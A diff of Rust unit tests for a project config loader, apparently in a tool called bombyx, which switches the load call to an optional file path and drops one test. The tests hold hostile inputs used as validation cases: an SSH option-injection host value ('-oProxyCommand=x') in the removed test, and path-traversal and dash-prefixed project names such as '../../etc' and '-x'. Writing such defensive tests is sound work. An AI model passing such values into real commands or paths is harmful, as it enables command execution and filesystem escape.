+        let path = dir.path().join("elsewhere.toml");
+        std::fs::write(&path, plain()).unwrap();
         let (cfg, origin) =
-            Config::load_project("myproject", &sources).unwrap();
+            Config::load_project("myproject", Some(&path)).unwrap();
         assert_eq!(cfg.project, "myproject");
         assert_eq!(cfg.host, "vmhost");
         assert_eq!(origin, HostOrigin::UserFile);
@@ -1926,11 +1107,8 @@ mod load_project_tests {
         // The directory exists and the file does not, which is
         // every machine bombyx has never run on.
         let dir = tempfile::tempdir().unwrap();
-        let sources = HostSources {
-            user_config_dir: Some(dir.path()),
-            ..HostSources::default()
-        };
-        let err = Config::load_project("myproject", &sources).unwrap_err();
+        let path = dir.path().join(USER_CONFIG_FILE);
+        let err = Config::load_project("myproject", Some(&path)).unwrap_err();
         assert!(matches!(err, ConfigError::RegistryNotFound { .. }), "{err}");
         let text = err.to_string();
         // The path to create, and what goes in it. A message
@@ -1943,36 +1121,14 @@ mod load_project_tests {
     #[test]
     fn no_config_directory_describes_the_file_instead() {
         // Nothing in the environment names a config directory,
-        // so there is no path to print and the message describes
-        // the file. `registry_place` decides both wordings.
-        let err = Config::load_project("myproject", &HostSources::default())
-            .unwrap_err();
+        // so `registry_file` produced no path, and the message
+        // describes the file rather than naming one.
+        // `registry_place` decides both wordings.
+        let err = Config::load_project("myproject", None).unwrap_err();
         assert!(matches!(err, ConfigError::RegistryNotFound { .. }), "{err}");
         let text = err.to_string();
         assert!(text.contains("config directory"), "{text}");
         assert!(text.contains("[projects.\"myproject\"]"), "{text}");
-    }
-
-    #[test]
-    fn a_bad_host_in_the_file_is_refused_even_when_the_flag_names_a_good_one() {
-        // The rule the operator asked for: a host written in the
-        // file is checked because it is in the file, not because
-        // this run turned out to want it. A typo in a line
-        // nothing consults is still a typo, and it would
-        // otherwise sit there until the day that line wins.
-        let source =
-            test_registry("myproject", "good", Some("-oProxyCommand=x"));
-        let sources = HostSources {
-            flag: Some("from-flag"),
-            ..HostSources::default()
-        };
-        let err = load(&source, "myproject", &sources).unwrap_err();
-        let text = err.to_string();
-        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{text}");
-        // And the message names the table, because an operator
-        // with twenty projects in one file needs the heading to
-        // know which line to edit.
-        assert!(text.contains("[projects.\"myproject\"].host"), "{text}");
     }
 
     #[test]
@@ -1992,10 +1148,8 @@ mod load_project_tests {
         // name `check_segment` accepts.
         for name in ["a.b", "a-b.c", "myproject"] {
             for err in [
-                Config::load_project(name, &HostSources::default())
-                    .unwrap_err(),
-                load("host = \"vmhost\"\n", name, &HostSources::default())
-                    .unwrap_err(),
+                Config::load_project(name, None).unwrap_err(),
+                load("host = \"vmhost\"\n", name).unwrap_err(),
             ] {
                 let text = err.to_string();
                 assert!(
@@ -2020,11 +1174,10 @@ mod load_project_tests {
         // `name::check_segment`, and the point here is that
         // `load_project` consults that function at all.
         for name in ["", ".", "..", "../../etc", "-x", "a/b", "a/"] {
-            // No registry directory, which is the path that had
-            // no check: with one, `Registry::project` runs the
-            // rule before the map lookup.
-            let err = Config::load_project(name, &HostSources::default())
-                .unwrap_err();
+            // No registry path, which is the route that had no
+            // check: with one, `Registry::project` runs the rule
+            // before the map lookup.
+            let err = Config::load_project(name, None).unwrap_err();
             let text = err.to_string();
             assert!(
                 matches!(
